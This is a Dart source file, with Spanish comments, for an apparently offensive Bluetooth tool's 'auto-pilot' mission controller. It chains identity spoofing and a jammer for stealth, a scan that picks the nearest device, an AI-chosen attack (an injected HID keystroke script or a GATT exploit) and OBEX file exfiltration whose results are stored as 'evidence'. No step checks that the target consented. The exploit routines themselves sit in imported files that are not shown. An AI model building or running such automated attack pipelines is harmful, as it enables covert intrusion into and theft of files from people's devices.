import 'dart:async';
import 'real_exploit_service.dart';
import 'integrated_ai_service.dart';
import 'real_database_service.dart';

enum MissionState { idle, stealth, reconnaissance, exploitation, exfiltration, completed, failed }

class MissionControlService {
  final RealExploitService _exploitService = RealExploitService();
  final IntegratedAIService _aiService = IntegratedAIService();
  final RealDatabaseService _dbService = RealDatabaseService();

  final _stateController = StreamController<MissionState>.broadcast();
  Stream<MissionState> get stateStream => _stateController.stream;

  final _logController = StreamController<String>.broadcast();
  Stream<String> get logStream => _logController.stream;

  bool _isAutoPilotActive = false;

  void _addLog(String msg) => _logController.add('[AUTO-PILOT] $msg');

  /// Inicia la Misión Autónoma
  Future<void> launchAutonomousMission() async {
    if (_isAutoPilotActive) return;
    _isAutoPilotActive = true;
    _stateController.add(MissionState.stealth);

    try {
      // FASE 1: SIGILO
      _addLog('Iniciando Fase 1: Sigilo y Rotación...');
      await _exploitService.rotateHardwareIdentity();
      await _exploitService.startLogicJammer();
      _addLog('Identidad rotada y Blackout activo.');

      // FASE 2: RECONOCIMIENTO
      _stateController.add(MissionState.reconnaissance);
      _addLog('Iniciando Fase 2: Escaneo Profundo...');
      final scanResult = await _exploitService.startScan();
      final List<Map<String, dynamic>> targets = List.from(scanResult['devices'] ?? []);

      if (targets.isEmpty) {
        throw Exception('No se encontraron objetivos en el rango de radio.');
      }

      // Seleccionar el mejor objetivo (mayor RSSI)
      targets.sort((a, b) => int.parse(b['rssi']).compareTo(int.parse(a['rssi'])));
      final target = targets.first;
      _addLog('Objetivo prioritario fijado: ${target['name']} (${target['address']})');

      // FASE 3: EXPLOTACIÓN (IA)
      _stateController.add(MissionState.exploitation);
      _addLog('Iniciando Fase 3: Análisis de IA y Explotación...');
      final aiAnalysis = await _aiService.identifyAndOptimize(target, isBlackoutActive: true);
      _addLog('IA recomienda: ${aiAnalysis['recommendedAttack']} (Éxito: ${aiAnalysis['successProbability']}%)');

      // Ejecutar ataque según recomendación
      if (aiAnalysis['recommendedAttack'].toString().contains('HID')) {
        final script = await _aiService.generateAIScript(target);
        await _exploitService.injectHIDScript(target['address'], script);
        _addLog('Script HID inyectado automáticamente.');
      } else {
        await _exploitService.executeAttack(deviceAddress: target['address'], type: 'basic');
        _addLog('Ataque de vulnerabilidad GATT ejecutado.');
      }

      // FASE 4: EXFILTRACIÓN
      _stateController.add(MissionState.exfiltration);
      _addLog('Iniciando Fase 4: Exfiltración de Evidencias...');
      
      // Intentar OBEX si es posible
      final fileResult = await _exploitService.exfiltrateFiles(target['address']);
      if (fileResult['success'] == true) {
        await _dbService.saveEvidence(
          targetAddress: target['address'],
          type: 'OBEX_FILES',
          data: fileResult['message'],
        );
        _addLog('Evidencias de archivos guardadas en la base de datos.');
      }

      // Limpieza y cierre
      await _exploitService.stopLogicJammer();
      _stateController.add(MissionState.completed);
      _addLog('Misión cumplida con éxito. Identidad protegida.');

    } catch (e) {
      _addLog('ERROR CRÍTICO EN MISIÓN: $e');
      _stateController.add(MissionState.failed);
      await _exploitService.stopLogicJammer();
    } finally {
      _isAutoPilotActive = false;
    }
  }

  void stopMission() {
    _isAutoPilotActive = false;
    _exploitService.stopLogicJammer();
    _stateController.add(MissionState.idle);
    _addLog('Misión abortada por el usuario.');
  }
}
